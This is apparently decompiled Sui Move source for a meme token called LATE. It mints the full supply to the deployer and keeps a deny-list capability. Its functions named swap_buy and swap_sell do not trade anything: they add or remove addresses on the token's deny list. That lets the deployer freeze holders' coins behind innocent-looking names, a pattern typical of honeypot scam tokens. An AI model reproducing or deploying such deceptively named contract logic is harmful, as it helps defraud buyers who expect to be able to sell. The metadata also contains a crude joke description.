module 0xda7103efe11a688f106270cb0c829b26b80ef7cb974b7f5b0d7774763ef12104::late {
    struct LATE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: LATE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<LATE>(arg0, 9, b"LATE", b"fuck you boss I'm late", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmSKCpRRPb7hKAsqSfQ1mfYcTig84rfRjZuXBRM1sWKETw"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<LATE>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<LATE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<LATE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<LATE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LATE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<LATE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LATE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<LATE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

